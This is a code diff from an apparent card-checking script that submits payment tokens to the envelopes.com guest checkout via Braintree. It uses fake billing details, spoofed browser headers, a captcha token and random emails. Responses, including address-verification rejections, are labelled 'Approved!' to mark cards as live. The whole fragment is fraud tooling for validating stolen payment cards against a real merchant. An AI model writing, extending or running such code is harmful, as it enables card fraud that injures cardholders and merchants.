@@ -92,14 +92,14 @@ class b35:
             token_card = Autocomplet().cut_str(r7.text,'{"token":"','"')
 
             headers = {'accept': '*/*','accept-language': 'es-MX,es;q=0.9','content-type': 'application/json','newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI4MjA1NTUiLCJhcCI6IjY1NjYyNTc5MyIsImlkIjoiY2M4NGFlNjlkYzNlNzBiMyIsInRyIjoiZDM4NWNkNjY2MjViNTUyNjA0ZWQ3OGZjYjFkZDJmMTciLCJ0aSI6MTc3NjYxOTU2NzY5OCwidGsiOiIxMzIyODQwIn19','origin': 'https://www.envelopes.com','priority': 'u=1, i','referer': 'https://www.envelopes.com/checkout/','traceparent': '00-d385cd66625b552604ed78fcb1dd2f17-cc84ae69dc3e70b3-01','tracestate': '1322840@nr=0-1-2820555-656625793-cc84ae69dc3e70b3----1776619567698','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36','x-newrelic-id': 'Vg4FUVNWDRAGV1haDgMDVVU=','x-recaptcha': captcha_token,'x-requested-with': 'XMLHttpRequest',}
-            json_data = {'cartId': entity_id,'billingAddress': {'countryId': 'US','regionId': '43','region': '','street': ['261 Morrin Road',],'company': '','telephone': '5667873443','postcode': '10010','city': 'NEW YORK','firstname': 'fernanda','lastname': 'Hot','saveInAddressBook': None,},'paymentMethod': {'method': 'braintree','additional_data': {'payment_method_nonce': token_card,'device_data': '{"device_session_id":"f5b8108f997e9e89080a01e964da33be","fraud_merchant_id":null,"correlation_id":"7ec1e63f1234752443ac650a87beabf9"}',},},'email': self.UseMail,}
+            json_data = {'cartId': entity_id,'billingAddress': {'countryId': 'US','regionId': '43','region': '','street': ['261 Morrin Road',],'company': '','telephone': '5667873443','postcode': '10010','city': 'NEW YORK','firstname': 'fernanda','lastname': 'Hot','saveInAddressBook': None,},'paymentMethod': {'method': 'braintree','additional_data': {'payment_method_nonce': token_card,'device_data': '{"device_session_id":"f5b8108f997e9e89080a01e964da33be","fraud_merchant_id":null,"correlation_id":"7ec1e63f1234752443ac650a87beabf9"}',},},'email': CorreoRand,}
             r8 = self.session.post(f'https://www.envelopes.com/rest/env_en_us/V1/guest-carts/{entity_id}/payment-information',headers=headers,json=json_data,)
             self.session.close()
 
             Suceess = r8.text 
             msg = Autocomplet().cut_str(Suceess,'"message":"', '"')
 
-            if '"success":true' in r8.text: return "Approved! 5.79 ✅"
+            if '"success":true' in r8.text: return "Approved! 5.79 ✅", msg
 
             elif "Your payment could not be taken. Please try again or use a different payment method. Gateway Rejected: avs" in msg: return "Approved! ✅", msg
 
